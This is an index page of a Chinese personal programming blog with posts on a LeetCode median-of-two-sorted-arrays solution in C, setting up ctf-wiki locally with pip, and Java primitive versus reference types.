<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="May the Force be with you.">
<meta property="og:type" content="website">
<meta property="og:title" content="hxt&#39;s Blog">
<meta property="og:url" content="http://example.com/page/6/index.html">
<meta property="og:site_name" content="hxt&#39;s Blog">
<meta property="og:description" content="May the Force be with you.">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="hxt">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/6/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>hxt's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>


<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">hxt's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>æ—¥ç¨‹è¡¨</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/05/%E5%AF%BB%E6%89%BE%E4%B8%A4%E4%B8%AA%E6%AD%A3%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/07/05/%E5%AF%BB%E6%89%BE%E4%B8%A4%E4%B8%AA%E6%AD%A3%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0/" class="post-title-link" itemprop="url">å¯»æ‰¾ä¸¤ä¸ªæ­£åºæ•°ç»„çš„ä¸­ä½æ•°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-07-05 17:28:55 / ä¿®æ”¹æ—¶é—´ï¼š17:34:09" itemprop="dateCreated datePublished" datetime="2023-07-05T17:28:55+08:00">2023-07-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/LeetCode/" itemprop="url" rel="index"><span itemprop="name">LeetCode</span></a>
                </span>
                  ï¼Œ
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" itemprop="url" rel="index"><span itemprop="name">æ•°æ®ç»“æ„</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>1.1k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>1 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>é¢˜ç›®åœ°å€ï¼šhttps://leetcode.cn/problems/median-of-two-sorted-arrays/</p>
<blockquote>
<p>é¢˜ç›®æè¿°ï¼š</p>
<p>ç»™å®šä¸¤ä¸ªå¤§å°åˆ†åˆ«ä¸º <code>m</code> å’Œ <code>n</code>
çš„æ­£åºï¼ˆä»å°åˆ°å¤§ï¼‰æ•°ç»„ <code>nums1</code> å’Œ
<code>nums2</code>ã€‚è¯·ä½ æ‰¾å‡ºå¹¶è¿”å›è¿™ä¸¤ä¸ªæ­£åºæ•°ç»„çš„
<strong>ä¸­ä½æ•°</strong> ã€‚</p>
<p>ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦åº”è¯¥ä¸º <code>O(log (m+n))</code> ã€‚</p>
<p>ç¤ºä¾‹ ï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šnums1 = [1,3], nums2 = [2]</span><br><span class="line">è¾“å‡ºï¼š2.00000</span><br><span class="line">è§£é‡Šï¼šåˆå¹¶æ•°ç»„ = [1,2,3] ï¼Œä¸­ä½æ•° 2</span><br></pre></td></tr></tbody></table></figure>
</blockquote>
<p>ç¬¬äº”è¡Œï¼Œæˆ‘ä¸€å¼€å§‹çš„å†™æ³•æ˜¯</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i,j; i&lt;nums1Size, j&lt;nums2Size;)</span><br></pre></td></tr></tbody></table></figure>
<p>è¿™é‡Œæˆ‘çŠ¯äº†ä¸€ä¸ªä½çº§é”™è¯¯ï¼Œæ€ä¹ˆæäº¤éƒ½ä¸å¯¹<span class="github-emoji"><span>ğŸ˜“</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>ï¼Œæ­£ç¡®å†™æ³•ä¸ºï¼š</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i,j; i&lt;nums1Size &amp;&amp; j&lt;nums2Size;)</span><br></pre></td></tr></tbody></table></figure>
<p>å®Œæ•´ä»£ç ï¼š</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> <span class="title function_">findMedianSortedArrays</span><span class="params">(<span class="type">int</span>* nums1, <span class="type">int</span> nums1Size, <span class="type">int</span>* nums2, <span class="type">int</span> nums2Size)</span>{</span><br><span class="line">    <span class="type">int</span> nums3[nums1Size + nums2Size]; <span class="comment">//å®šä¹‰æ–°æ•°ç»„</span></span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,k=<span class="number">0</span>;</span><br><span class="line">    <span class="type">double</span> result;</span><br><span class="line">    <span class="keyword">for</span> (i,j; i&lt;nums1Size &amp;&amp; j&lt;nums2Size;){ <span class="comment">//è®²è¾ƒå°çš„å€¼æ”¾å…¥nums3ä¸­</span></span><br><span class="line">        <span class="keyword">if</span> (nums1[i] &lt;= nums2[j]){</span><br><span class="line">            nums3[k] = nums1[i];</span><br><span class="line">            i++;</span><br><span class="line">            k++;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span>{</span><br><span class="line">            nums3[k] = nums2[j];</span><br><span class="line">            j++;</span><br><span class="line">            k++;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(j,k; j&lt; nums2Size; j++,k++){ <span class="comment">//nums1Size &lt; nums2Size æ—¶ï¼Œä¼šæ‰§è¡Œè¯¥ä»£ç </span></span><br><span class="line">        nums3[k] = nums2[j];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i,k; i&lt; nums1Size; i++,k++){ <span class="comment">//nums1Size &gt; nums2Size æ—¶ï¼Œä¼šæ‰§è¡Œè¯¥ä»£ç </span></span><br><span class="line">        nums3[k] = nums1[i];</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> m=<span class="number">0</span>;</span><br><span class="line">    m = nums1Size + nums2Size;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(m%<span class="number">2</span> == <span class="number">0</span>){ <span class="comment">//å…ƒç´ æ€»æ•°ä¸ºå¶æ•°</span></span><br><span class="line">        result = (nums3[m/<span class="number">2</span>] + nums3[m/<span class="number">2</span><span class="number">-1</span>])/<span class="number">2.0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> { <span class="comment">//å…ƒç´ æ€»æ•°ä¸ºå¥‡æ•°</span></span><br><span class="line">        result = nums3[m/<span class="number">2</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/25/%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2ctf-wiki/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/25/%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2ctf-wiki/" class="post-title-link" itemprop="url">æœ¬åœ°éƒ¨ç½²ctf-wiki</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-06-25 23:04:06 / ä¿®æ”¹æ—¶é—´ï¼š23:20:15" itemprop="dateCreated datePublished" datetime="2023-06-25T23:04:06+08:00">2023-06-25</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>955</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>1 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>é¦–å…ˆæ‰“å¼€ ctf-wiki çš„GitHubä»“åº“
https://github.com/ctf-wiki/ctf-wiki/blob/master/README-zh_CN.md</p>
<p>æ ¹æ®æ­¥éª¤æ“ä½œï¼Œè¿™é‡Œæˆ‘ç”¨çš„æ˜¯ç¬¬ä¸€ç§æ–¹æ³•ï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 1. clone</span><br><span class="line">git clone https://github.com/ctf-wiki/ctf-wiki.git</span><br><span class="line"># 2. requirements</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line"># generate static file in site/</span><br><span class="line">python3 scripts/docs.py build-all        &lt;-----å¦‚æœæ˜¯Windowsï¼Œä½¿ç”¨'python'è€Œä¸æ˜¯'python3'</span><br><span class="line"># deploy at http://127.0.0.1:8008</span><br><span class="line">python3 scripts/docs.py serve</span><br></pre></td></tr></tbody></table></figure>
<p>åœ¨è¿è¡Œ<code>python scripts/docs.py build-all</code>æ—¶å‘ç”ŸæŠ¥é”™ï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AttributeError: module 'jinja2' has no attribute 'contextfilter'</span><br></pre></td></tr></tbody></table></figure>
<p>æ ¹æ®è¿™ç¯‡<a target="_blank" rel="noopener" href="https://forums.docker.com/t/jinja-mkdocs-issue-breaks-docker101tutorial/122671">æ–‡ç« </a>ï¼Œæˆ‘è¿›è¡Œäº†ä¿®æ”¹ï¼Œé¦–å…ˆä½¿ç”¨<code>pip uninstall jinja2</code>åˆ é™¤å­˜åœ¨çš„<code>jinja2</code>ï¼Œç„¶åæ‰“å¼€<code>requirements.txt</code>æ–‡ä»¶ï¼Œåœ¨æœ€åä¸€è¡Œæ·»åŠ <code>jinja2==3.0.3</code>ï¼Œé‡æ–°è¿è¡Œ<code>pip install -r requirements.txt</code>ï¼Œç„¶åå†æ¬¡è¿è¡Œ<code>python scripts/docs.py build-all</code>ï¼ŒæˆåŠŸè§£å†³æŠ¥é”™ï¼Œç»§ç»­è¿è¡Œ<code>python scripts/docs.py serve</code>ï¼Œä¼šå‡ºç°</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Warning: this is a very simple server.</span><br><span class="line">For development, use the command live instead.</span><br><span class="line">This is here only to preview a site with translations already built.</span><br><span class="line">Make sure you run the build-all command first.</span><br><span class="line">Serving at: http://127.0.0.1:8008</span><br></pre></td></tr></tbody></table></figure>
<p>æ­¤æ—¶åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€<code>http://127.0.0.1:8008</code>å³å¯è®¿é—®ctf-wikiã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/18/primitive-type%E5%92%8Creference-type/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/05/18/primitive-type%E5%92%8Creference-type/" class="post-title-link" itemprop="url">primitive typeå’Œreference type</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-05-18 15:22:19" itemprop="dateCreated datePublished" datetime="2023-05-18T15:22:19+08:00">2023-05-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2024-01-09 15:41:35" itemprop="dateModified" datetime="2024-01-09T15:41:35+08:00">2024-01-09</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>1.1k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>1 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>æ•°æ®ç±»å‹å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼šåŸºæœ¬æ•°æ®ç±»å‹ï¼ˆprimitive
typeï¼‰å’Œå¼•ç”¨æ•°æ®ç±»å‹ï¼ˆreference typeï¼‰ã€‚</p>
<p><strong>åŸºæœ¬æ•°æ®ç±»å‹</strong>æ˜¯æŒ‡æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¸ƒå°”å€¼ç­‰ï¼ˆ<code>byte</code>ã€<code>short</code>ã€<code>int</code>ã€<code>long</code>ã€
<code>float</code>ã€ <code>double</code>ã€
<code>boolean</code>ã€<code>char</code>ï¼‰ã€‚è¿™äº›ç±»å‹çš„å€¼æ˜¯ç›´æ¥å­˜å‚¨åœ¨å†…å­˜ä¸­çš„ï¼Œå®ƒä»¬çš„å¤§å°æ˜¯å›ºå®šçš„ï¼Œå› æ­¤å®ƒä»¬çš„æ“ä½œé€Ÿåº¦éå¸¸å¿«ã€‚</p>
<p><strong>å¼•ç”¨æ•°æ®ç±»å‹</strong>æ˜¯æŒ‡<strong>å¯¹è±¡</strong>ã€<strong>æ•°ç»„</strong>ã€<strong>å‡½æ•°</strong>ç­‰ç±»å‹ã€‚è¿™äº›ç±»å‹çš„å€¼æ˜¯å­˜å‚¨åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œè€Œä¸æ˜¯ç›´æ¥å­˜å‚¨åœ¨å˜é‡ä¸­ã€‚å› æ­¤ï¼Œå½“æˆ‘ä»¬æ“ä½œå¼•ç”¨ç±»å‹æ—¶ï¼Œå®é™…ä¸Šæ˜¯åœ¨æ“ä½œå­˜å‚¨åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œè€Œä¸æ˜¯å®é™…çš„å€¼ã€‚è¿™ä½¿å¾—å¼•ç”¨æ•°æ®ç±»å‹çš„æ“ä½œé€Ÿåº¦ç›¸å¯¹è¾ƒæ…¢ã€‚</p>
<p>ä¸€ä¸ªé‡è¦çš„åŒºåˆ«æ˜¯ï¼ŒåŸºæœ¬æ•°æ®ç±»å‹çš„å€¼åœ¨ä¼ é€’ç»™å‡½æ•°æˆ–èµ‹å€¼ç»™å¦ä¸€ä¸ªå˜é‡æ—¶ï¼Œä¼šè¢«å¤åˆ¶ä¸€ä»½ã€‚è€Œå¼•ç”¨æ•°æ®ç±»å‹çš„å€¼åœ¨ä¼ é€’ç»™å‡½æ•°æˆ–èµ‹å€¼ç»™å¦ä¸€ä¸ªå˜é‡æ—¶ï¼Œåªä¼šå¤åˆ¶å®ƒçš„åœ°å€ï¼Œè€Œä¸æ˜¯å®ƒçš„å€¼ã€‚è¿™æ„å‘³ç€ï¼Œå¦‚æœæˆ‘ä»¬ä¿®æ”¹äº†ä¸€ä¸ªå¼•ç”¨æ•°æ®ç±»å‹çš„å€¼ï¼Œå®ƒä¼šå½±å“åˆ°æ‰€æœ‰å¼•ç”¨è¯¥å€¼çš„å˜é‡ã€‚</p>
<h2 id="åŸºæœ¬æ•°æ®ç±»å‹">åŸºæœ¬æ•°æ®ç±»å‹</h2>
<p>ä¾‹å¦‚ï¼Œåœ¨Javaä¸­ï¼Œintæ˜¯ä¸€ç§åŸºæœ¬æ•°æ®ç±»å‹ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹ä»£ç ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> a; <span class="comment">// bçš„å€¼æ˜¯10ï¼Œè€Œä¸æ˜¯açš„åœ°å€</span></span><br><span class="line">b = <span class="number">20</span>; <span class="comment">// açš„å€¼ä»ç„¶æ˜¯10</span></span><br></pre></td></tr></tbody></table></figure>
<h2 id="å¼•ç”¨æ•°æ®ç±»å‹">å¼•ç”¨æ•°æ®ç±»å‹</h2>
<p><strong>å¯¹è±¡</strong>é€šå¸¸æ˜¯å¼•ç”¨æ•°æ®ç±»å‹ï¼Œä¾‹å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PollQuestions</span> {</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">      <span class="type">Walrus</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Walrus</span>(<span class="number">1000</span>, <span class="number">8.3</span>);</span><br><span class="line">      Walrus b;</span><br><span class="line">      b = a;</span><br><span class="line">      b.weight = <span class="number">5</span>;   <span class="comment">//ä¿®æ”¹b.weightçš„å€¼ï¼ŒåŒæ—¶a.weightçš„å€¼ä¹Ÿè¢«æ”¹å˜äº†</span></span><br><span class="line">      System.out.println(a);</span><br><span class="line">      System.out.println(b);       </span><br><span class="line">   }</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Walrus</span> {</span><br><span class="line">      <span class="keyword">public</span> <span class="type">int</span> weight;</span><br><span class="line">      <span class="keyword">public</span> <span class="type">double</span> tuskSize;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">public</span> <span class="title function_">Walrus</span><span class="params">(<span class="type">int</span> w, <span class="type">double</span> ts)</span> {</span><br><span class="line">         weight = w;</span><br><span class="line">         tuskSize = ts;</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> {</span><br><span class="line">         <span class="keyword">return</span> String.format(<span class="string">"weight: %d, tusk size: %.2f"</span>, weight, tuskSize);</span><br><span class="line">      }</span><br><span class="line">   }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>è¾“å‡ºç»“æœä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weight: 5, tusk size: 8.30</span><br><span class="line">weight: 5, tusk size: 8.30</span><br></pre></td></tr></tbody></table></figure>
<p>æ€»ä¹‹ï¼Œè¿™ä¸¤ç§æ•°æ®ç±»å‹åœ¨ç¼–ç¨‹ä¸­éƒ½éå¸¸å¸¸è§ï¼Œç†è§£å®ƒä»¬ä¹‹é—´çš„åŒºåˆ«éå¸¸é‡è¦ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/02/Java%E4%B8%AD%E7%9A%84%E9%9D%99%E6%80%81%E4%B8%8E%E9%9D%9E%E9%9D%99%E6%80%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
